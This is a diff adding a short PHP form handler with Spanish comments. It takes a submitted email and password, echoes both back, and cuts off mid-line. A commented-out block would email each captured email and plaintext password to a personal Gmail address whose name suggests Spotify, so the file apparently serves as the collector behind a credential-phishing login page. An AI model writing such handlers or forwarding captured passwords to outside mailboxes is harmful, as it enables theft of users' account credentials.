@@ -1,0 +1,21 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Obtener los datos del formulario
+    $email = $_POST['email'];
+    $password = $_POST['password'];
+
+    // Aquí puedes agregar la lógica para validar el inicio de sesión
+    // Por ejemplo, verificar si el correo electrónico y la contraseña son correctos
+
+    // Para este ejemplo, simplemente mostraremos los datos recibidos
+    echo "<h1>Datos recibidos</h1>";
+    echo "<p><strong>Correo electrónico:</strong> " . htmlspecialchars($email) . "</p>";
+    echo "<p><strong>Contraseña:</strong> " . htmlspecialchars($password) . "</p>";
+
+    // Si deseas enviar un correo electrónico, puedes hacerlo aquí
+    // $to = 'anaspotify2100@gmail.com';
+    // $subject = 'Nuevo inicio de sesión';
+    // $message = "Correo electrónico: $email\nContraseña: $password";
+    // $headers = 'From: noreply@tu-dominio.com' . "\r\n" .
+    //            'Reply-To: noreply@tu-dominio.com' . "\r\n" .
+    //            'X-Mailer
